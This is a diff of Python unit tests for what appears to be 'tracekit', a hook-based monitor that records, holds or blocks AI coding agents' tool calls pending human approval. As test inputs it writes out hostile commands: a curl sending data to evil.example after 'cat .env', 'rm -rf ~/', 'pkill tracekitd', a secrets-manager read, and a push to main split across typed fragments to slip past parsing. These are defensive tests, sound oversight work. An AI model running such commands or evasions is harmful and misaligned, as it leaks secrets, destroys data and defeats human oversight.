@@ -120,6 +120,37 @@ class HookV2(unittest.TestCase):
         proc.stderr.close()
         return proc.returncode, err
 
+    def test_a_call_a_shadow_rule_records_gets_one_line_for_the_person(self):
+        # TK-Q001 and TK-Q002 are in shadow in 1.8: the call runs, and Claude Code shows the person one line then, in
+        # plain words: where it sends, after which read in which session, and how long an inherited label carries
+        def stdout(command, sid, tid):
+            proc = self.pre(command, tid=tid, sid=sid, wait=False)
+            out, err = proc.stdout.read(), proc.stderr.read()
+            proc.wait(60)
+            proc.stdout.close()
+            proc.stderr.close()
+            self.assertEqual(proc.returncode, 0, err)
+            return out
+        tail = " Nothing is blocked in 1.8; it's in the record."
+        self.assertEqual(stdout("curl -d x https://evil.example/u", "s0", "t0"), "")   # no secret read yet
+        self.assertEqual(json.loads(stdout("nohup curl -d x https://evil.example/u &", "s0", "t1"))["systemMessage"],
+                         "[tracekit] noted: this starts a send in the background (nohup), which may run after a "
+                         "secret is read." + tail)
+        stdout("cat .env", "s1", "t2")
+        self.assertEqual(json.loads(stdout("curl -d x https://evil.example/u", "s1", "t3"))["systemMessage"],
+                         "[tracekit] noted: this sends data to evil.example after the session ran `cat .env`." + tail)
+        first = self.run_handle("s1").run_id
+        self.assertEqual(json.loads(stdout("gh issue comment 1 -b x", "s2", "t4"))["systemMessage"],
+                         f"[tracekit] noted: this sends data with gh after an earlier session (run {first}) ran `cat "
+                         f".env`; this carries while that session is open, or clear it: tracekit signer incidents "
+                         f"clear-label {first} --label secrets_access." + tail)
+        for sid in ("s1", "s2"):   # both ended: the label carries from the one that ended last
+            self.hook("SessionEnd", sid=sid, reason="prompt_input_exit")
+        self.assertRegex(json.loads(stdout("gh issue comment 1 -b x", "s3", "t5"))["systemMessage"],
+                         r"after an earlier session \(run [0-9a-f]{32}\) ran `cat \.env`; this carries for (60|59) "
+                         rf"more minutes, or clear it: tracekit signer incidents clear-label {first} --label "
+                         r"secrets_access\.")
+
     def test_allow_then_post_completes_with_the_binding(self):
         self.assertEqual(self.hook("SessionStart")[0], 0)
         self.assertEqual(self.pre("ls"), (0, ""))
@@ -1080,9 +1111,129 @@ class HookV2(unittest.TestCase):
         self.assertEqual(code, 0)
         self.assertIn("allowing (fail-open)", err)
 
+    def test_an_open_fail_mode_still_blocks_the_fail_closed_classes(self):
+        """With no signer answering and the run's fail mode open, secrets, deploys, payments and pushes to main (and
+        what the dev pack holds) are blocked by the hook; routine work runs. Each is the hook's own decision: kept, sent
+        as an untrusted observation once the signer answers, shown by the viewer and doctor."""
+        from tracekit import doctor, view
+        self.assertEqual(self.hook("SessionStart")[0], 0)
+        with open(claude_code._state("s1")) as f:
+            st = json.load(f)
+        with open(claude_code._state("s1"), "w") as f:
+            json.dump(dict(st, fail_modes={"default": "open"}), f)
+        os.environ["TRACEKIT_SIGNER"] = os.path.join(self.dir, "nowhere.sock")
+        for tid, command, code in (("t1", "ls", 0), ("t2", "aws secretsmanager get-secret-value --secret-id x", 2),
+                                   ("t3", "npm publish", 2), ("t4", "git push origin " + "main", 2),
+                                   ("t5", "rm -rf ~/", 2)):
+            got, err = self.pre(command, tid=tid)
+            self.assertEqual(got, code, (command, err))
+            self.assertIn("decided by the hook while the signer was down", err)
+        got, err = self.hook("PreToolUse", tool_name="mcp__stripe__create_refund", tool_input={"charge": "c"},
+                             tool_use_id="t6")
+        self.assertEqual(got, 2, err)
+        self.assertIn("blocking (fail-closed: payments)", err)
+        kept = doctor._hook_decided()
+        self.assertEqual([(x["tool_use_id"], x["decision"], x.get("sent")) for x in kept],
+                         [("t1", "allowed", None)] + [(t, "blocked", None) for t in ("t2", "t3", "t4", "t5", "t6")])
+        self.assertEqual([x["why"] for x in kept[1:4]], ["secrets", "deploys", "pushes to main"])
+        del os.environ["TRACEKIT_SIGNER"]
+        self.assertEqual(self.pre("ls", tid="t7"), (0, ""))   # the signer answers: the hook's account goes first
+        seen = [e for e in self.events() if e["type"] == "input.observed"]
+        self.assertEqual([e["data"]["source"] for e in seen],
+                         ["claude-code:hook-decided:allowed:Bash"] + ["claude-code:hook-decided:blocked:Bash"] * 4 +
+                         ["claude-code:hook-decided:blocked:mcp__stripe__create_refund"])
+        self.assertEqual({e["data"]["trust"] for e in seen}, {"untrusted"})
+        self.assertTrue(all(x["sent"] for x in doctor._hook_decided()))
+        # the six calls the hook decided left one signed gap counting each once: each send the outage refused used a
+        # client_seq, and no observation skips another (the review's W7a: the allowed one was counted twice)
+        evs = self.events()
+        gaps = [e for e in evs if e["type"] == "capture.gap" and e["data"]["kind"] == "client_counter_gap"]
+        self.assertEqual(len(gaps), 1)
+        self.assertEqual(gaps[0]["data"]["missed_events"], 6)
+        # (the gap's lost calls may have read a secret: the run's label, 1.8 A, is signed first)
+        after = [e for e in evs[evs.index(gaps[0]) + 1:] if e["type"] != "run.label"]
+        self.assertEqual(after[0]["data"]["source"], "claude-code:hook-decided:allowed:Bash")
+        tr = view.Translator()
+        title = lambda e: tr.feed({"event": {"run_id": "r1", **e}, "seq": 1})[0]["title"]   # noqa: E731
+        tr.feed({"event": {**evs[0], "run_id": "r1"}, "seq": 0})   # (its run.registered: a same-user signer)
+        self.assertEqual(title(seen[1]), "THE AGENT-SIDE HOOK REPORTS · blocked Bash while the signer was down")
+        # a trusted one is no hook's, and reads as any input; under another signer a hook's report is unexpected
+        self.assertEqual(title({**seen[1], "data": {**seen[1]["data"], "trust": "trusted"}}),
+                         "INPUT · claude-code:hook-decided:blocked:Bash")
+        tr.feed({"event": {**evs[0], "run_id": "r1", "data": {**evs[0]["data"], "signer_isolation": "separate-user"}},
+                 "seq": 0})
+        self.assertTrue(title(seen[1]).startswith("UNEXPECTED: THE AGENT-SIDE HOOK REPORTS"))
+
+    def test_a_call_the_hook_let_run_skips_a_client_seq_and_the_queue_is_untrusted(self):
+        """Each call the hook decided with no signer answering is one event the signer never got: one whose failed
+        send used no client_seq (`used` not true) goes one past the last sent, so the signer's client_counter_gap
+        counts each call once. The queue is the agent's to write: doctor reads what it can of it and never fails on
+        it."""
+        from tracekit import doctor
+        os.makedirs(os.environ["TRACEKIT_RUNTIME_DIR"], 0o700, exist_ok=True)
+        queue = claude_code._state("s9", claude_code.HOOK_DECIDED)
+        with open(queue, "w") as f:
+            json.dump([{"ts": 1, "tool": "Bash", "tool_use_id": "a", "decision": "allowed"},
+                       {"ts": 2, "tool": "Bash", "tool_use_id": "b", "decision": "blocked", "why": "deploys"},
+                       {"ts": "x", "tool": "Bash", "tool_use_id": "c", "decision": "allowed", "used": True}, 7, "junk"],
+                      f)
+        sent = []
+        with mock.patch.object(claude_code.RunHandle, "call", lambda self, method, **f: sent.append(
+                (method, f["client_seq"], f["source"])) or {}):
+            st = claude_code._flush_decided(None, claude_code._state("s9"), {"run_id": "r", "run_token": "t",
+                                                                              "stream": "s", "seq": 10}, "s9")
+        self.assertEqual(sent, [("observe", 11, "claude-code:hook-decided:allowed:Bash"),
+                                ("observe", 13, "claude-code:hook-decided:blocked:Bash"),
+                                ("observe", 14, "claude-code:hook-decided:allowed:Bash")])
+        self.assertEqual(st["seq"], 15)
+        self.assertEqual([x["tool_use_id"] for x in doctor._hook_decided()], ["c", "a", "b"])   # (a ts no number: first)
+
+    def test_typed_input_split_across_calls_with_no_signer_answering(self):
+        """The review's two calls: Codex types `gi`, then `t push origin main` and a line end, into one terminal while
+        no signer answers and the run's fail mode is open. The fragment doesn't run, so the push never forms; the same
+        second call after a fragment the signer allowed is read as the line it completes, and blocked."""
+        def codex(tid, chars, shell_id):
+            payload = {"session_id": "cx1", "hook_event_name": "PreToolUse", "tool_name": "write_stdin",
+                       "tool_use_id": tid, "tool_input": {"session_id": shell_id, "chars": chars}}
+            out, err = io.StringIO(), io.StringIO()
+            previous_agent = claude_code.AGENT
+            try:
+                code = harness_hooks.run("codex", json.dumps(payload), out, err)
+            finally:
+                claude_code.AGENT = previous_agent
+            return code, err.getvalue() + out.getvalue()
+
+        previous_agent = claude_code.AGENT
+        try:
+            self.assertEqual(harness_hooks.run("codex", json.dumps({"session_id": "cx1", "hook_event_name":
+                                                                    "SessionStart", "source": "startup"}),
+                                               io.StringIO(), io.StringIO()), 0)
+        finally:
+            claude_code.AGENT = previous_agent
+        self.assertEqual(codex("u1", "gi", 7)[0], 0)   # with the signer answering: a fragment, kept
+        with open(claude_code._state("cx1")) as f:
+            st = json.load(f)
+        with open(claude_code._state("cx1"), "w") as f:
+            json.dump(dict(st, fail_modes={"default": "open"}), f)
+        os.environ["TRACEKIT_SIGNER"] = os.path.join(self.dir, "nowhere.sock")
+        code, err = codex("d1", "gi", 8)
+        self.assertEqual(code, 2, err)
+        self.assertIn("typed text a later call could finish into a command", err)
+        code, err = codex("d2", "t push origin main\n", 7)   # the line `gi` began, the signer gone
+        self.assertEqual(code, 2, err)
+        self.assertIn("pushes to main", err)
+
+    def record_hook_python(self):
+        """What `tracekit init` leaves in the client config: the Python the plugin's hook runs in."""
+        client = os.path.join(os.environ["HOME"], ".tracekit-client")
+        os.makedirs(client, exist_ok=True)
+        with open(os.path.join(client, "config.json"), "w") as f:
+            json.dump({"hook_python": sys.executable, "hook_python_allowed": True}, f)
+
     def test_the_plugin_decides_through_the_dev_signer(self):
-        os.environ.update(CLAUDE_PLUGIN_ROOT=os.path.join(ROOT, "plugin"), TRACEKIT_PYTHON=sys.executable)
-        with open(os.path.join(ROOT, "plugin", "hooks", "hooks.json")) as f:
+        os.environ.update(CLAUDE_PLUGIN_ROOT=os.path.join(ROOT, "plugin"))
+        self.record_hook_python()
+        with open(os.path.join(ROOT, "plugin", "hooks", "claude.json")) as f:
             cmd = json.load(f)["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
         for tid, command, code in (("t1", "pkill tracekitd", 2), ("t2", "ls", 0)):   # no hook_event_name: hooks.json names it
             p = subprocess.run(cmd, shell=True, cwd=self.cwd, capture_output=True, text=True, timeout=60, input=json.dumps(
@@ -1098,6 +1249,41 @@ class HookV2(unittest.TestCase):
                                                                         "tool_name": "Bash", "tool_input": {}}))
             self.assertEqual(p.returncode, code, (event, p.stderr))
             self.assertIn("signer unreachable", p.stderr.splitlines()[0])
+
+    def test_the_plugins_codex_copilot_and_cursor_hooks_decide_through_the_dev_signer(self):
+        """The plugin's hooks for Codex, Copilot CLI and Cursor run each harness's own hook (harness_hooks), with the
+        harness's payload, from the variable each sets to the plugin's directory, and answer in the harness's own form
+        (Claude Code's hook, which those harnesses ran from the plugin's default hooks file, answers in Claude Code's)."""
+        self.record_hook_python()
+        plugin = os.path.join(ROOT, "plugin")
+        harnesses = {   # (root variable, the pre-tool event, its entry's command field, a payload for a shell call,
+            # the deny the harness reads on stdout)
+            "codex": ("PLUGIN_ROOT", "PreToolUse", lambda g: g["hooks"][0]["command"],
+                      lambda tid, c: {"session_id": "cx", "turn_id": "1", "hook_event_name": "PreToolUse",
+                                      "tool_name": "Bash", "tool_use_id": tid, "tool_input": {"command": c}},
+                      lambda out: set(out) == {"hookSpecificOutput"} and
+                      out["hookSpecificOutput"]["permissionDecision"] == "deny"),
+            "copilot": ("COPILOT_PLUGIN_ROOT", "preToolUse", lambda g: g["bash"],
+                        lambda tid, c: {"sessionId": "cp", "toolCallId": tid, "toolName": "bash",
+                                        "toolArgs": {"command": c}},
+                        lambda out: out["permissionDecision"] == "deny"),
+            "cursor": ("CURSOR_PLUGIN_ROOT", "preToolUse", lambda g: g["command"],
+                       lambda tid, c: {"conversation_id": "cu", "generation_id": "1", "hook_event_name": "preToolUse",
+                                       "tool_name": "Shell", "tool_use_id": tid, "tool_input": {"command": c}},
+                       lambda out: out["permission"] == "deny"),
+        }
+        for harness, (var, pre, field, payload, denied) in harnesses.items():
+            with self.subTest(harness=harness):
+                with open(os.path.join(plugin, "hooks", harness + ".json")) as f:
+                    cmd = field(json.load(f)["hooks"][pre][0])
+                env = dict(os.environ, **{var: plugin})
+                for tid, command, code in ((f"{harness}-1", "pkill tracekitd", 2), (f"{harness}-2", "ls", 0)):
+                    p = subprocess.run(cmd, shell=True, cwd=self.cwd, capture_output=True, text=True, timeout=60,
+                                       env=env, input=json.dumps(payload(tid, command)))
+                    self.assertEqual(p.returncode, code, p.stderr)
+                    if code == 2:
+                        self.assertIn("TK-D007", p.stdout + p.stderr)
+                        self.assertTrue(denied(json.loads(p.stdout)), p.stdout)
 
     def test_only_a_tool_call_is_blocked_by_the_hooks_init_writes(self):
         """A hook that could not finish exited 2 on every event: an unreachable signer erased each prompt and sent
@@ -1537,8 +1723,9 @@ class HeldCalls(unittest.TestCase):
         before the commands, which the cut then dropped: it names them first too, and the wait's outcome (held, or
         rejected and by whom, which was dropped) now comes first in the reply."""
         packs = map(service.load_policy, glob.glob(os.path.join(ROOT, "tracekit", "policy2", "packs", "*.yaml")))
-        self.assertEqual(max((len(service.SignerService._reasons(types.SimpleNamespace(policy=e), [r["id"]])), r["id"])
-                             for e in packs for sec, r, *_ in e.rules if sec == "ask")[1], "TK-A043")
+        sizes = {r["id"]: len(service.SignerService._reasons(types.SimpleNamespace(policy=e), [r["id"]]))
+                 for e in packs for sec, r, *_ in e.rules if sec == "ask"}   # (TK-A095 says what TK-A043 says)
+        self.assertEqual({k for k, v in sizes.items() if v == max(sizes.values())}, {"TK-A043", "TK-A095"})
         cursor = install._hook_command("tracekit.integrations.harness_hooks", "entry", ("cursor", "preToolUse"))
 
         def payload(tid):
@@ -1622,6 +1809,32 @@ class HeldCalls(unittest.TestCase):
         why = service.SignerService._reasons(types.SimpleNamespace(policy=pol), ["TK-SHELL-PARSE", "TK-A043"])
         self.assertTrue(why.startswith("moving money"), why)
         self.assertIn("; the policy can't read what this shell command runs. ", why)
+
+    def test_two_rules_that_say_the_same_say_it_once(self):
+        """A real-use preview of 1.8: a held Stripe GET without -q (TK-A043, and TK-A095, which reads curl by its
+        grammar) said "moving money (a Stripe, PayPal or Square charge, …)" twice in its Why line. Each reason, like
+        each remedy, is given once, in the hook's message too."""
+        pol = service.load_policy(os.path.join(ROOT, "tracekit", "policy2", "packs", "coding.yaml"))
+        why = service.SignerService._reasons(types.SimpleNamespace(policy=pol), ["TK-A043", "TK-A095", "TK-F001"])
+        self.assertEqual((why.count("moving money"), why.count("Run a GET as")), (1, 1), why)
+        code, _, err = self.pre('curl -G https://api.stripe.com/v1/charges -u "$STRIPE_KEY:" -d limit=3', "t1")
+        self.assertEqual((code, "TK-A043" in err, "TK-A095" in err), (2, True, True), err)
+        self.assertEqual(err.count("moving money"), 1, err)
+
+    def test_a_denied_call_names_only_the_denys_reason_and_remedy_beside_a_hold(self):
+        """A write of a sitecustomize.py into the tool venv is denied (TK-D013) and held (TK-A067), and its message said
+        "no one can approve it" beside "Have a person approve the held call": a deny's reason and remedy are all it shows."""
+        pol = service.load_policy(os.path.join(ROOT, "tracekit", "policy2", "packs", "coding.yaml"))
+        me = types.SimpleNamespace(policy=pol)
+        why = service.SignerService._reasons(me, ["TK-D013", "TK-A067"])
+        self.assertIn("writing Tracekit's own files", why)
+        self.assertNotIn(".pth", why)
+        self.assertNotIn("approve", why)
+        held = service.SignerService._reasons(me, ["TK-A067"])   # (a hold alone keeps its own)
+        self.assertIn(".pth", held)
+        self.assertIn("approve", held)
+        mixed = service.SignerService._reasons(me, ["TK-SHELL-PARSE", "TK-D007"])   # an engine hold beside a deny: the deny's
+        self.assertNotIn("can't read", mixed)
 
     def test_the_agent_cannot_approve_its_own_held_call(self):
         """The agent runs the approve command the notice names: the policy denies it (TK-D012), so its retry stays
@@ -2161,7 +2374,9 @@ class HoldLine(unittest.TestCase):
         veto = "approved by an agent approver; people may still revoke it, so wait 42 s"
         held = ["[tracekit] HELD, nothing ran: apr-1 (TK-A003) is approved by an agent approver; people may still "
                 "revoke it, so wait 42 s, then make the identical call again.", "Why: x",
-                "Person: look with `! tracekit approvals show apr-1`.",   # no approve command: it is approved
+                # no approve command: it is approved; a person may take it back
+                "Person: look with `! tracekit approvals show apr-1`; take it back before it runs with `! tracekit "
+                "approvals revoke apr-1`.",
                 # #587 review: not "wait for their answer", which the person has no answer to give
                 "Agent: wait as the first line says, then make the identical call again; if it is held again, tell the "
                 "person and pass on what it says. Never hide what a call runs to get past the policy: every call is "
@@ -2181,6 +2396,23 @@ class HoldLine(unittest.TestCase):
         self.assertEqual(code, 2)
         self.assertIn(f"; allow once with `tracekit approvals --signer {named} approve apr-1`;", lines[-2])
         self.assertNotIn("`! ", "\n".join(lines))
+
+    def test_system_modes_commands_run_as_the_person_runs_tracekit_there(self):
+        """The acceptance test: in system mode the hook printed `tracekit approvals --signer … approve`, but init puts
+        no `tracekit` on the person's PATH, and the system signer is their default anyway: the root-owned venv's
+        Python, `-I -m tracekit`, as the docs say, with no --signer and no `!`."""
+        from tracekit.install import OPT_PYTHON
+        sock = "/run/tracekit-signer/signer.sock"
+        with mock.patch.object(claude_code, "system_config", lambda: {"signer": sock}):
+            code, lines, _ = self.pre("x", signer=sock, wait="")
+            self.assertEqual(code, 2)
+            self.assertIn(f"Person: look with `{OPT_PYTHON} -I -m tracekit approvals show apr-1`; allow once with "
+                          f"`{OPT_PYTHON} -I -m tracekit approvals approve apr-1`; refuse with `{OPT_PYTHON} -I -m "
+                          "tracekit approvals reject apr-1`.", lines)
+            self.assertNotIn("--signer", "\n".join(lines))
+            self.assertNotIn("`! ", "\n".join(lines))
+            self.assertEqual(claude_code.approvals_cmd(sock), f"{OPT_PYTHON} -I -m tracekit approvals")
+            self.assertEqual(claude_code.approvals_cmd("/elsewhere.sock"), "tracekit approvals --signer /elsewhere.sock")
 
     def test_an_unanswered_wait_ends_with_how_to_approve_and_retry(self):
         code, lines, _ = self.pre("x", wait="0.2", answer="requested")
